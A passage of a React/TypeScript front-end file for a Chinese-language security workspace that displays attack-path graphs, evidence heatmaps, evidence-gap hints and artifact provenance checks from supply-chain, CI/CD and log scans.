                      <Search className='pointer-events-none absolute left-3 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground' />
                      <Input
                        id='graph-node-search'
                        value={graphSearch}
                        onChange={(event) => setGraphSearch(event.target.value)}
                        placeholder='名称、类型、证据...'
                        className='h-9 rounded-md pl-8 text-sm'
                      />
                    </div>
                    {graphSearch.trim() ? (
                      <div className='text-xs text-muted-foreground'>匹配节点 {searchMatchedCount}</div>
                    ) : null}
                  </div>
                  <div className='space-y-2'>
                    <div className='text-xs font-medium text-muted-foreground'>证据类别</div>
                    <div className='flex flex-wrap gap-2'>
                      {graphGroupFilters.map((filter) => (
                        <Button
                          key={filter.group || 'all'}
                          type='button'
                          variant={activeNodeGroupFilter === filter.group ? 'default' : 'outline'}
                          size='sm'
                          className='rounded-md'
                          onClick={() => {
                            setActiveNodeGroupFilter(filter.group)
                            setActiveNodeTypeFilter(null)
                            focusGraphGroup(filter.group)
                          }}
                        >
                          {filter.label}
                          <Badge variant='outline' className='ml-1 rounded-md bg-[color:var(--surface-panel)]'>
                            {filter.count}
                          </Badge>
                        </Button>
                      ))}
                    </div>
                  </div>
                  <div className='space-y-2'>
                    <Label htmlFor='graph-node-type' className='text-xs text-muted-foreground'>
                      细分节点类型
                    </Label>
                    <select
                      id='graph-node-type'
                      value={activeNodeTypeFilter ?? ''}
                      onChange={(event) => {
                        const nextType = event.target.value || null
                        setActiveNodeTypeFilter(nextType)
                        focusGraphType(nextType)
                      }}
                      className='h-9 w-full rounded-md border bg-background px-3 text-sm'
                    >
                      {graphFilters.map((filter) => (
                        <option key={filter.type || 'all'} value={filter.type ?? ''}>
                          {filter.label}（{filter.count}）
                        </option>
                      ))}
                    </select>
                    <div className='flex items-center justify-between gap-3 rounded-md border bg-background px-3 py-2'>
                      <div className='min-w-0'>
                        <div className='text-sm font-medium'>只看当前路径</div>
                        <div className='truncate text-xs text-muted-foreground'>隐藏无关节点</div>
                      </div>
                      <Switch
                        checked={pathOnlyMode}
                        onCheckedChange={setPathOnlyMode}
                        disabled={!selectedPath}
                        aria-label='只看当前路径'
                      />
                    </div>
                    {(activeNodeTypeFilter || activeNodeGroupFilter || graphSearch.trim()) ? (
                      <Button
                        type='button'
                        variant='outline'
                        size='sm'
                        className='w-full rounded-md'
                        onClick={() => {
                          setActiveNodeTypeFilter(null)
                          setActiveNodeGroupFilter(null)
                          setGraphSearch('')
                          setManualFocusNodeRef(null)
                        }}
                      >
                        <RefreshCw className='size-3.5' />
                        清除筛选
                      </Button>
                    ) : null}
                  </div>
                </div>
                <div className='flex flex-wrap gap-2'>
                  {graph?.summary ? (
                    <>
                      <Badge variant='outline' className='rounded-md'>
                        {graph.summary.node_count} 节点 · {graph.summary.edge_count} 边
                      </Badge>
                      <Badge variant='outline' className='rounded-md'>
                        当前显示 {nodes.length} 节点 · {edges.length} 关系
                      </Badge>
                      <Badge variant='outline' className='rounded-md'>
                        可行动路径 {graph.summary.actionable_attack_path_count ?? 0}
                      </Badge>
                      <Badge variant='outline' className='rounded-md'>
                        平均置信度 {Math.round((graph.summary.average_path_confidence ?? 0) * 100)}%
                      </Badge>
                    </>
                  ) : null}
                </div>
                <div className='h-[560px] max-h-[64svh] min-h-[420px] overflow-hidden rounded-md border'>
                  {nodes.length ? (
                    <ReactFlow
                      nodes={nodes}
                      edges={edges}
                      fitView
                      fitViewOptions={{ padding: 0.18 }}
                      nodesDraggable={false}
                      onInit={(instance) => setFlowInstance(instance)}
                      className='security-flow'
                    >
                      <Background />
                      <Controls />
                      <MiniMap pannable zoomable />
                    </ReactFlow>
                  ) : (
                    <div className='flex h-full items-center justify-center p-6 text-center text-sm text-muted-foreground'>
                      {activeNodeTypeFilter || activeNodeGroupFilter || graphSearch.trim()
                        ? '没有匹配当前筛选条件的节点，请清除筛选后重试。'
                        : '暂无图谱节点；完成代码、供应链、CI/CD 或日志扫描后会在这里生成证据关系。'}
                    </div>
                  )}
                </div>
              </div>
            ) : null}
          </CardContent>
        </Card>
        </div>

        <div className={cn(moduleSidebarColumnClass, 'xl:pb-6')}>
        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <BrainCircuit className='size-4 text-emerald-600' />
              当前路径解释
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            <CurrentPathInsightPanel
              path={selectedPath}
              selectedPathIsTrust={selectedPathIsTrust}
              attackPaths={attackPaths}
            />
            {!displayedPaths.length && !attackPaths.length
              ? pipeline.map((step) => (
                  <div key={step.step} className='rounded-md border p-3'>
                    <div className='flex items-center justify-between gap-2'>
                      <div className='font-medium'>{step.name}</div>
                      <Badge variant='outline' className={cn('rounded-md', statusClasses[step.status] || statusClasses.observed)}>
                        {step.status}
                      </Badge>
                    </div>
                    <p className='mt-2 text-sm leading-6 text-muted-foreground'>{step.detail}</p>
                  </div>
                ))
              : null}
            {!displayedPaths.length && attackPaths.length ? (
              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
                当前范围暂无路径；切换到“全部”查看已有证据关系。
              </div>
            ) : null}
            {!attackPaths.length && !pipeline.length ? (
              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
                暂无攻击路径；完成扫描后会根据证据链生成可验证路径。
              </div>
            ) : null}
          </CardContent>
        </Card>
        </div>
      </div>
    </div>
  )
}

function PathConclusionCard({
  path,
  summary,
  mode,
  visibleNodeCount,
  visibleEdgeCount,
}: {
  path?: KnowledgeGraphAttackPath
  summary?: NonNullable<NonNullable<SecurityWorkspace['graph']>['summary']>
  mode: GraphDisplayMode
  visibleNodeCount: number
  visibleEdgeCount: number
}) {
  if (!path && !summary) {
    return (
      <Card className='rounded-md'>
        <CardContent className='p-4 text-sm text-muted-foreground'>
          暂无攻击路径结论；完成供应链、CI/CD、产物可信和日志扫描后会自动生成。
        </CardContent>
      </Card>
    )
  }

  const isTrustPath = isTrustProvenancePath(path)
  const verdict = pathVerdictLabel(path?.verdict)
  const confidence = Math.round((path?.confidence ?? summary?.average_path_confidence ?? 0) * 100)
  const nodeCount = summary?.node_count ?? visibleNodeCount
  const edgeCount = summary?.edge_count ?? visibleEdgeCount
  const title = path?.title || '攻击路径研判结论'

  return (
    <Card className='rounded-md'>
      <CardContent className='space-y-4 p-4'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0 space-y-2'>
            <div className='flex flex-wrap items-center gap-2'>
              <Badge variant='outline' className={cn('rounded-md', pathVerdictClass(path?.verdict))}>
                {verdict}
              </Badge>
              <Badge variant='outline' className={cn('rounded-md', isTrustPath ? statusClasses.active : severityClasses[path?.severity ?? 'medium'])}>
                {isTrustPath ? `可信评分 ${path?.trust_score ?? path?.score ?? '-'}` : `风险分 ${path?.score ?? '-'}`}
              </Badge>
              <Badge variant='outline' className='rounded-md'>
                {confidence}% 置信
              </Badge>
              <Badge variant='outline' className='rounded-md'>
                {mode === 'trust' ? '可信证明链' : mode === 'attack' ? '攻击路径' : '全部路径'}
              </Badge>
            </div>
            <div>
              <h3 className='break-words text-lg font-semibold leading-7 [overflow-wrap:anywhere]'>{title}</h3>
            </div>
          </div>
          <div className='grid min-w-[260px] grid-cols-3 gap-2 text-center'>
            <div className='rounded-md border bg-muted/20 px-3 py-2'>
              <div className='text-lg font-semibold'>{nodeCount}</div>
              <div className='text-xs text-muted-foreground'>节点</div>
            </div>
            <div className='rounded-md border bg-muted/20 px-3 py-2'>
              <div className='text-lg font-semibold'>{edgeCount}</div>
              <div className='text-xs text-muted-foreground'>关系</div>
            </div>
            <div className='rounded-md border bg-muted/20 px-3 py-2'>
              <div className='text-lg font-semibold'>{summary?.actionable_attack_path_count ?? 0}</div>
              <div className='text-xs text-muted-foreground'>可行动</div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function CompactPathSelector({
  paths,
  selectedPath,
  displayModes,
  activeMode,
  onModeChange,
  onSelect,
}: {
  paths: KnowledgeGraphAttackPath[]
  selectedPath?: KnowledgeGraphAttackPath
  displayModes: Array<{ value: GraphDisplayMode; label: string; count: number; icon: ReactNode }>
  activeMode: GraphDisplayMode
  onModeChange: (mode: GraphDisplayMode) => void
  onSelect: (path: KnowledgeGraphAttackPath) => void
}) {
  return (
    <div className='space-y-3 rounded-md border bg-muted/15 p-3'>
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <div className='flex flex-wrap gap-2'>
          {displayModes.map((mode) => (
            <Button
              key={mode.value}
              type='button'
              variant={activeMode === mode.value ? 'default' : 'outline'}
              size='sm'
              className='rounded-md'
              onClick={() => onModeChange(mode.value)}
            >
              {mode.icon}
              {mode.label}
              <Badge variant='outline' className='ml-1 rounded-md bg-[color:var(--surface-panel)]'>
                {mode.count}
              </Badge>
            </Button>
          ))}
        </div>
        <Badge variant='outline' className='rounded-md'>
          当前：{selectedPath?.title || '未选择路径'}
        </Badge>
      </div>
      {paths.length ? (
        <div className='flex gap-2 overflow-x-auto pb-1'>
          {paths.map((path, index) => {
            const selected = selectedPath?.id === path.id
            const isTrustPath = isTrustProvenancePath(path)
            return (
              <button
                key={path.id}
                type='button'
                onClick={() => onSelect(path)}
                className={cn(
                  'w-[430px] max-w-[78vw] flex-none rounded-md border bg-background px-3 py-2 text-left transition hover:bg-muted/35',
                  selected && (
                    isVerifiedProvenancePath(path)
                      ? 'border-emerald-300 bg-emerald-50/60 dark:border-emerald-900 dark:bg-emerald-950/20'
                      : isTrustPath
                        ? 'border-teal-300 bg-teal-50/55 dark:border-teal-900 dark:bg-teal-950/20'
                        : 'border-red-300 bg-red-50/50 dark:border-red-900 dark:bg-red-950/20'
                  )
                )}
              >
                <div className='flex items-start justify-between gap-3'>
                  <div className='min-w-0 break-words text-sm font-semibold leading-5 [overflow-wrap:anywhere]'>
                    路径 {index + 1}：{path.title}
                  </div>
                  <Badge variant='outline' className={cn('shrink-0 rounded-md', pathVerdictClass(path.verdict))}>
                    {Math.round((path.confidence ?? 0) * 100)}%
                  </Badge>
                </div>
                <div className='mt-1 break-words text-xs leading-5 text-muted-foreground [overflow-wrap:anywhere]'>
                  {pathStartFullLabel(path)} → {pathEndFullLabel(path)}
                </div>
                <div className='mt-2 flex flex-wrap gap-1.5'>
                  <Badge variant='outline' className={cn('rounded-md', isTrustPath ? statusClasses.active : severityClasses[path.severity] || statusClasses.observed)}>
                    {isTrustPath ? `可信 ${path.trust_score ?? path.score}` : `风险 ${path.score}`}
                  </Badge>
                  <Badge variant='outline' className='rounded-md'>
                    {(path.path_steps ?? []).length || (path.node_ids ?? []).length} 环节
                  </Badge>
                  <Badge variant='outline' className='rounded-md'>
                    {(path.evidence_ids ?? []).length} 证据
                  </Badge>
                </div>
              </button>
            )
          })}
        </div>
      ) : (
        <div className='rounded-md border border-dashed bg-background p-4 text-sm text-muted-foreground'>
          当前范围暂无候选路径；可以切换到“全部”，或先完成供应链、CI/CD、产物可信和日志印证。
        </div>
      )}
    </div>
  )
}

function AttackChainMap({
  path,
  graphNodes,
  selectedPathIsTrust,
}: {
  path?: KnowledgeGraphAttackPath
  graphNodes: KnowledgeGraphNode[]
  selectedPathIsTrust: boolean
}) {
  if (!path) {
    return (
      <div className='rounded-md border border-dashed p-8 text-center text-sm text-muted-foreground'>
        暂无攻击链；完成供应链、CI/CD、产物可信和日志印证后会在这里生成可读链路。
      </div>
    )
  }

  const stages = buildAttackChainStages(path, graphNodes)

  return (
    <div className='space-y-4'>
      <div className='grid gap-3 md:grid-cols-3'>
        <InfoBox label='路径结论' value={path.conclusion || path.description} />
        <InfoBox label='建议动作' value={path.recommendation} />
        <InfoBox label='可封堵点' value={path.choke_points?.map((point) => `${point.label}: ${point.action}`).join('；') || '暂无明确封堵点'} />
      </div>

      {selectedPathIsTrust ? (
        <TrustedProvenancePanel path={path} compact />
      ) : (
        <div className='grid gap-3 md:grid-cols-2'>
          <EvidenceGapPanel path={path} compact />
          <UpgradeHintPanel path={path} compact />
        </div>
      )}

      {stages.length ? (
        <div className='rounded-md border bg-gradient-to-b from-cyan-50/55 to-background p-4 dark:from-cyan-950/15'>
          <div className='mb-4 flex flex-wrap items-center justify-between gap-2'>
            <div>
              <div className='text-sm font-semibold'>攻击链线路图</div>
              <div className='text-xs text-muted-foreground'>
                按证据顺序串联入口、传播环节和受影响资产，适合演示系统如何得出结论。
              </div>
            </div>
            <Badge variant='outline' className='rounded-md bg-background/80'>
              {stages.length} 个阶段
            </Badge>
          </div>
          <div className='overflow-x-auto pb-2'>
            <div className='grid min-w-[920px] gap-3' style={{ gridTemplateColumns: `repeat(${stages.length}, minmax(220px, 1fr))` }}>
              {stages.map((stage, index) => (
                <AttackChainStageCard
                  key={stage.id}
                  stage={stage}
                  isLast={index === stages.length - 1}
                />
              ))}
            </div>
          </div>
        </div>
      ) : (
        <div className='rounded-md border border-dashed p-6 text-sm text-muted-foreground'>
          当前路径只有结论，没有结构化步骤或节点；请切换到技术图谱查看原始关系。
        </div>
      )}
    </div>
  )
}

function AttackChainStageCard({
  stage,
  isLast,
}: {
  stage: AttackChainStage
  isLast: boolean
}) {
  return (
    <div className='relative'>
      {!isLast ? (
        <div className='absolute left-[calc(100%-12px)] top-10 hidden h-0.5 w-6 bg-cyan-300 lg:block' />
      ) : null}
      <div className={cn('h-full rounded-md border bg-background p-3 shadow-sm', attackStageClass(stage.kind))}>
        <div className='flex items-start justify-between gap-2'>
          <div className='flex items-center gap-2'>
            <div className='flex size-9 items-center justify-center rounded-md border bg-background'>
              {attackStageIcon(stage.kind)}
            </div>
            <div>
              <div className='text-xs text-muted-foreground'>阶段 {stage.index}</div>
              <div className='text-sm font-semibold'>{stage.title}</div>
            </div>
          </div>
          <Badge variant='outline' className='rounded-md bg-background/80'>
            {stage.confidence}%
          </Badge>
        </div>
        <div className='mt-3 space-y-2 text-xs'>
          <div className='rounded-md bg-muted/35 p-2'>
            <div className='text-muted-foreground'>链路</div>
            <div className='mt-1 space-y-1 font-medium' title={`${stage.source} → ${stage.target}`}>
              <div className='break-all leading-5'>{stage.source}</div>
              <div className='text-muted-foreground'>→</div>
              <div className='break-all leading-5'>{stage.target}</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

function EvidenceHeatmap({
  path,
  graphNodes,
  selectedPathIsTrust,
}: {
  path?: KnowledgeGraphAttackPath
  graphNodes: KnowledgeGraphNode[]
  selectedPathIsTrust: boolean
}) {
  if (!path) {
    return (
      <div className='rounded-md border border-dashed p-6 text-center text-sm text-muted-foreground'>
        请选择一条候选路径查看证据热力图。
      </div>
    )
  }

  const stages = buildAttackChainStages(path, graphNodes)
  const evidenceTypes = ['组件', 'CI/CD', '产物', '日志', '外部告警', '代码', '其他']
  const gaps = pathEvidenceGaps(path)

  return (
    <div className='space-y-4'>
      <div className='grid gap-3 md:grid-cols-3'>
        <InfoBox label='路径结论' value={path.conclusion || path.description} />
        <InfoBox label='建议动作' value={path.recommendation} />
        <InfoBox label='可封堵点' value={path.choke_points?.map((point) => `${point.label}: ${point.action}`).join('；') || '暂无明确封堵点'} />
      </div>

      <div className='overflow-x-auto rounded-md border'>
        <div className='min-w-[860px]'>
          <div className='grid border-b bg-muted/35 text-xs font-medium text-muted-foreground' style={{ gridTemplateColumns: `220px repeat(${evidenceTypes.length}, minmax(92px, 1fr))` }}>
            <div className='p-3'>攻击阶段</div>
            {evidenceTypes.map((type) => (
              <div key={type} className='border-l p-3 text-center'>{type}</div>
            ))}
          </div>
          {stages.map((stage) => (
            <div key={stage.id} className='grid border-b last:border-b-0' style={{ gridTemplateColumns: `220px repeat(${evidenceTypes.length}, minmax(92px, 1fr))` }}>
              <div className='p-3'>
                <div className='font-medium'>{stage.title}</div>
              </div>
              {evidenceTypes.map((type) => {
                const active = stage.evidenceGroups.includes(type)
                const intensity = active ? Math.min(100, Math.max(38, stage.confidence)) : 0
                return (
                  <div key={`${stage.id}-${type}`} className='flex items-center justify-center border-l p-2'>
                    <div
                      className={cn(
                        'flex h-10 w-full items-center justify-center rounded-md text-xs font-medium',
                        active
                          ? selectedPathIsTrust
                            ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/40 dark:text-emerald-200'
                            : 'bg-cyan-100 text-cyan-800 dark:bg-cyan-950/40 dark:text-cyan-200'
                          : 'bg-muted/35 text-muted-foreground'
                      )}
                      style={active ? { opacity: intensity / 100 } : undefined}
                    >
                      {active ? `${stage.evidenceCount || 1} 条` : '缺口'}
                    </div>
                  </div>
                )
              })}
            </div>
          ))}
        </div>
      </div>

      <div className='grid gap-3 lg:grid-cols-2'>
        <div className='rounded-md border border-dashed bg-[color:var(--surface-panel)] p-4'>
          <div className='mb-2 flex items-center gap-2 text-sm font-semibold'>
            <AlertTriangle className='size-4 text-amber-600' />
            证据缺口
          </div>
          <div className='space-y-2'>
            {gaps.map((gap) => (
              <div key={gap} className='rounded-md bg-amber-50 px-3 py-2 text-xs leading-5 text-amber-800 dark:bg-amber-950/25 dark:text-amber-200'>
                {gap}
              </div>
            ))}
          </div>
        </div>
        <EvidenceRecommendationPanel path={path} />
      </div>
    </div>
  )
}

function CurrentPathInsightPanel({
  path,
  selectedPathIsTrust,
  attackPaths,
}: {
  path?: KnowledgeGraphAttackPath
  selectedPathIsTrust: boolean
  attackPaths: KnowledgeGraphAttackPath[]
}) {
  if (!path) {
    return (
      <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
        暂无路径结论；完成前面模块后，这里会解释当前攻击链为什么可信。
      </div>
    )
  }

  const gaps = pathEvidenceGaps(path)
  const evidenceCount = path.evidence_ids?.length ?? 0
  const stageCount = path.path_steps?.length || path.node_ids?.length || 0
  const confidence = Math.round((path.confidence ?? 0) * 100)

  return (
    <div className='space-y-3'>
      <div className='rounded-md border bg-muted/20 p-3'>
        <div className='flex items-start justify-between gap-2'>
          <div>
            <div className='text-xs text-muted-foreground'>系统判定</div>
            <div className='mt-1 font-semibold'>{path.title}</div>
          </div>
          <Badge variant='outline' className={cn('rounded-md', pathVerdictClass(path.verdict))}>
            {pathVerdictLabel(path.verdict)}
          </Badge>
        </div>
        <p className='mt-3 text-sm leading-6 text-muted-foreground'>{path.conclusion || path.description}</p>
      </div>

      <div className='grid grid-cols-2 gap-2'>
        <InfoPill label={selectedPathIsTrust ? '可信评分' : '风险分'} value={String(selectedPathIsTrust ? path.trust_score ?? path.score : path.score)} />
        <InfoPill label='路径可信度' value={`${confidence}%`} />
        <InfoPill label='路径环节' value={`${stageCount} 个`} />
        <InfoPill label='证据数量' value={`${evidenceCount} 条`} />
      </div>

      <div className='rounded-md border p-3'>
        <div className='mb-2 text-sm font-semibold'>为什么可信</div>
        <div className='space-y-2 text-xs leading-5 text-muted-foreground'>
          <div className='grid gap-1 sm:grid-cols-[40px_minmax(0,1fr)]'>
            <span className='text-foreground'>入口</span>
            <span className='min-w-0 break-words [overflow-wrap:anywhere]'>{pathStartFullLabel(path)}</span>
          </div>
          <div className='grid gap-1 sm:grid-cols-[40px_minmax(0,1fr)]'>
            <span className='text-foreground'>目标</span>
            <span className='min-w-0 break-words [overflow-wrap:anywhere]'>{pathEndFullLabel(path)}</span>
          </div>
          <div className='grid gap-1 sm:grid-cols-[40px_minmax(0,1fr)]'>
            <span className='text-foreground'>依据</span>
            <span className='min-w-0 break-words [overflow-wrap:anywhere]'>
              {path.evidence_summary?.[0]?.detail || path.path_steps?.[0]?.why_abusable || path.path_steps?.[0]?.trust_basis || '系统已把多源证据串联为同一条路径。'}
            </span>
          </div>
        </div>
      </div>

      <div className='rounded-md border border-dashed p-3'>
        <div className='mb-2 flex items-center gap-2 text-sm font-semibold'>
          <AlertTriangle className='size-4 text-amber-600' />
          还缺什么
        </div>
        <div className='space-y-1.5'>
          {gaps.slice(0, 3).map((gap) => (
            <div key={gap} className='text-xs leading-5 text-muted-foreground'>{gap}</div>
          ))}
        </div>
      </div>

      <div className='rounded-md border bg-cyan-50/55 p-3 dark:bg-cyan-950/20'>
        <div className='mb-2 text-sm font-semibold text-cyan-800 dark:text-cyan-200'>下一步建议</div>
        <p className='text-xs leading-5 text-muted-foreground'>
          {path.recommendation || '补充日志、产物可信证明和时间线证据，再导出溯源报告。'}
        </p>
      </div>

      <Badge variant='outline' className='w-full justify-center rounded-md'>
        当前工作区共有 {attackPaths.length} 条候选路径
      </Badge>
    </div>
  )
}

function InfoPill({ label, value }: { label: string; value: string }) {
  return (
    <div className='min-w-0 rounded-md border bg-muted/20 px-3 py-2'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-1 break-words text-sm font-medium'>{value}</div>
    </div>
  )
}

function InfoBox({ label, value }: { label: string; value?: string }) {
  return (
    <div className='min-w-0 rounded-md border bg-muted/20 p-3'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-2 break-words text-sm leading-6'>{value || '暂无'}</div>
    </div>
  )
}

function EvidenceRecommendationPanel({
  path,
}: {
  path: KnowledgeGraphAttackPath
}) {
  const recommendations = evidenceRecommendationsForPath(path).slice(0, 4)
  if (!recommendations.length) return null

  return (
    <div className='rounded-md border bg-muted/10 p-4'>
      <div className='mb-4 flex flex-wrap items-start justify-between gap-3'>
        <div>
          <div className='flex items-center gap-2 text-sm font-semibold'>
            <FileSearch className='size-4 text-cyan-600' />
            建议补充证据
          </div>
          <p className='mt-1 max-w-4xl text-xs leading-5 text-muted-foreground'>
            按当前路径缺口自动推荐补证材料，帮助把可疑路径升级为可复核的高可信溯源结论。
          </p>
        </div>
        <Badge variant='outline' className='rounded-md'>
          {recommendations.length} 项建议
        </Badge>
      </div>
      <div className='space-y-2'>
        {recommendations.map((item) => (
          <EvidenceRecommendationCard key={item.id} item={item} />
        ))}
      </div>
    </div>
  )
}

function EvidenceRecommendationCard({ item }: { item: EvidenceRecommendation }) {
  const priorityClass =
    item.priority === '高'
      ? severityClasses.high
      : item.priority === '中'
        ? severityClasses.medium
        : statusClasses.observed
  const keywordText = item.keywords.join(' ')

  async function copyKeywords() {
    if (!keywordText) return
    try {
      await navigator.clipboard.writeText(keywordText)
      toast.success('已复制检索关键词')
    } catch {
      toast.error('复制失败，请手动复制关键词')
    }
  }

  return (
    <div className='rounded-md border bg-background px-3 py-3'>
      <div className='grid gap-3 lg:grid-cols-[minmax(180px,0.9fr)_minmax(0,1.5fr)_minmax(180px,0.8fr)] lg:items-start'>
        <div className='min-w-0'>
          <div className='flex flex-wrap items-center gap-2'>
            <Badge variant='outline' className={cn('rounded-md', priorityClass)}>
              {item.priority}
            </Badge>
            <div className='min-w-0 truncate font-medium'>{item.title}</div>
          </div>
          <div className='mt-1 truncate text-xs text-muted-foreground'>{item.referenceModel}</div>
        </div>
        <div className='min-w-0'>
          <div className='text-xs text-muted-foreground'>证明价值</div>
          <p className='mt-1 line-clamp-2 text-sm leading-5'>{item.proves}</p>
        </div>
        <div className='min-w-0 text-xs leading-5 text-muted-foreground'>
          <div className='truncate'>
            <span className='text-foreground'>找：</span>{item.where}
          </div>
          <div className='truncate'>
            <span className='text-foreground'>传：</span>{item.uploadTo}
          </div>
        </div>
      </div>
      <Collapsible className='mt-3'>
        <CollapsibleTrigger asChild>
          <Button variant='ghost' size='sm' className='h-8 rounded-md px-2 text-xs'>
            证据样例和检索关键词
            <ChevronDown className='size-3.5' />
          </Button>
        </CollapsibleTrigger>
        <CollapsibleContent className='mt-2 grid gap-2 md:grid-cols-2'>
          <div className='rounded-md bg-muted/35 p-2'>
            <div className='mb-2 text-xs font-medium text-muted-foreground'>建议上传材料</div>
            <div className='flex flex-wrap gap-1.5'>
              {item.examples.map((example) => (
                <Badge key={example} variant='outline' className='rounded-md bg-background'>
                  {example}
                </Badge>
              ))}
            </div>
          </div>
          <div className='rounded-md bg-muted/35 p-2'>
            <div className='mb-2 flex items-center justify-between gap-2'>
              <div className='text-xs font-medium text-muted-foreground'>检索关键词</div>
              <Button
                type='button'
                variant='outline'
                size='sm'
                className='h-7 rounded-md px-2'
                disabled={!keywordText}
                onClick={copyKeywords}
              >
                <Copy className='size-3.5' />
                复制
              </Button>
            </div>
            <div className='flex flex-wrap gap-1.5'>
              {item.keywords.length ? (
                item.keywords.map((keyword) => (
                  <Badge key={keyword} variant='outline' className='max-w-full rounded-md bg-background font-mono text-[11px]'>
                    <span className='truncate'>{keyword}</span>
                  </Badge>
                ))
              ) : (
                <span className='text-xs text-muted-foreground'>暂无关键词，可先补充路径证据。</span>
              )}
            </div>
          </div>
        </CollapsibleContent>
      </Collapsible>
    </div>
  )
}

function EvidenceGapPanel({
  path,
  compact = false,
}: {
  path: KnowledgeGraphAttackPath
  compact?: boolean
}) {
  const gaps = pathEvidenceGaps(path)

  return (
    <div className={cn('rounded-md border border-dashed bg-[color:var(--surface-panel)]', compact ? 'p-3' : 'p-4')}>
      <div className='mb-2 flex items-center gap-2 text-xs font-medium text-muted-foreground'>
        <AlertTriangle className='size-3.5 text-amber-600' />
        证据缺口
      </div>
      <div className='space-y-1.5'>
        {gaps.slice(0, compact ? 2 : 4).map((gap) => (
          <div key={gap} className='text-xs leading-5 text-muted-foreground'>
            {gap}
          </div>
        ))}
      </div>
    </div>
  )
}

function UpgradeHintPanel({
  path,
  compact = false,
}: {
  path: KnowledgeGraphAttackPath
  compact?: boolean
}) {
  return (
    <div className={cn('rounded-md border bg-emerald-50/60 dark:bg-emerald-950/20', compact ? 'p-3' : 'p-4')}>
      <div className='mb-2 flex items-center gap-2 text-xs font-medium text-emerald-700 dark:text-emerald-300'>
        <TrendingUp className='size-3.5' />
        补证据后可升级
      </div>
      <p className='text-xs leading-5 text-muted-foreground'>
        {upgradeHintForPath(path)}
      </p>
    </div>
  )
}

function TrustedProvenancePanel({
  path,
  compact = false,
}: {
  path: KnowledgeGraphAttackPath
  compact?: boolean
}) {
  const checks = trustedProvenanceChecks(path)
  const verified = path.verdict === 'verified-provenance-chain' && checks.every((check) => isTrustCheckPassLike(check.status))
  const score = path.trust_score ?? path.score ?? 0

  return (
    <div className={cn('rounded-md border border-emerald-200 bg-emerald-50/55 dark:border-emerald-900 dark:bg-emerald-950/20', compact ? 'p-3' : 'p-4')}>
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <div className='flex items-center gap-2 text-sm font-medium text-emerald-800 dark:text-emerald-200'>
          <ShieldCheck className='size-4' />
          产物可信证明链：{verified ? '已验证' : '需复核'}
        </div>
        <Badge variant='outline' className={cn('rounded-md', verified ? statusClasses.active : severityClasses.medium)}>
          可信评分 {score}
        </Badge>
      </div>
      <div className='mt-3 grid gap-2'>
        {checks.slice(0, 10).map((check) => (
          <div key={check.id || check.name || check.label} className='grid gap-1 rounded-md border bg-background/75 px-3 py-2 text-xs sm:grid-cols-[96px_1fr]'>
            <div className='flex items-center gap-1.5 font-medium'>
              {isTrustCheckPassLike(check.status) ? (
                <CheckCircle2 className='size-3.5 text-emerald-600' />
              ) : (
                <AlertTriangle className='size-3.5 text-amber-600' />
              )}
              {check.label || check.name}
            </div>
            <div className='min-w-0'>
              <div className='font-medium text-foreground'>{check.value || trustCheckStatusLabel(check.status)}</div>
              {check.evidence ? (
                <div className='mt-0.5 line-clamp-2 text-muted-foreground'>{check.evidence}</div>
              ) : null}
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

function buildAttackChainStages(path: KnowledgeGraphAttackPath, graphNodes: KnowledgeGraphNode[]): AttackChainStage[] {
  const nodeById = new Map(graphNodes.map((node) => [node.id, node]))
  const steps = path.path_steps ?? []

  if (steps.length) {
    return steps.map((step, index) => {
      const text = [
        step.source,
        step.source_type,
        step.target,
        step.target_type,
        step.relationship,
        step.edge_type,
        step.model,
        step.why_abusable,
        step.trust_basis,
      ].filter(Boolean).join(' ')
      const kind = attackStageKindFromText(text)
      const evidenceGroups = evidenceGroupsForAttackStage(kind, text)
      const source = step.source || '未知来源'
      const target = step.target || '未知目标'
      return {
        id: `${path.id}-step-${step.index ?? index}`,
        index: step.index ?? index + 1,
        title: attackStageTitle(kind, index),
        subtitle: `${graphNodeTypeLabel(step.source_type || 'EvidenceChain')} → ${graphNodeTypeLabel(step.target_type || 'EvidenceChain')}`,
        source,
        target,
        relation: step.relationship || step.edge_type || '证据关联',
        model: step.model || '证据关联',
        confidence: Math.round((step.confidence ?? path.confidence ?? 0) * 100),
        evidenceCount: step.evidence_ids?.length ?? 0,
        description: step.why_abusable || step.trust_basis || `${source} 与 ${target} 存在可复核的路径关系。`,
        kind,
        evidenceGroups,
      }
    })
  }

  return (path.node_ids ?? [])
    .map((nodeId, index) => {
      const node = nodeById.get(nodeId)
      const label = node?.label || nodeId
      const type = node?.type || 'EvidenceChain'
      const text = [label, type, node?.description, node?.source_model, node?.source].filter(Boolean).join(' ')
      const kind = attackStageKindFromText(text)
      return {
        id: `${path.id}-node-${nodeId}-${index}`,
        index: index + 1,
        title: attackStageTitle(kind, index),
        subtitle: graphNodeTypeLabel(type),
        source: index === 0 ? pathStartLabel(path) : '上一环节',
        target: label,
        relation: index === 0 ? '路径入口' : '证据传递',
        model: node?.source_model || '图谱节点',
        confidence: Math.round((path.confidence ?? 0) * 100),
        evidenceCount: index === 0 ? path.evidence_ids?.length ?? 0 : 0,
        description: node?.description || `${label} 是当前攻击链中的关键节点。`,
        kind,
        evidenceGroups: evidenceGroupsForAttackStage(kind, text),
      }
    })
}

function attackStageKindFromText(text: string): AttackChainStageKind {
  const normalized = text.toLowerCase()
  if (/audio|visual|multimodal|recognized|ocr|asr|alert|告警|截图|录音|视频/.test(normalized)) return 'external'
  if (/dependency|package|vulnerability|sbom|vex|npm|pypi|registry|依赖|组件|漏洞/.test(normalized)) return 'dependency'
  if (/ci|cd|workflow|runner|action|jenkins|gitlab|构建|流水线/.test(normalized)) return 'build'
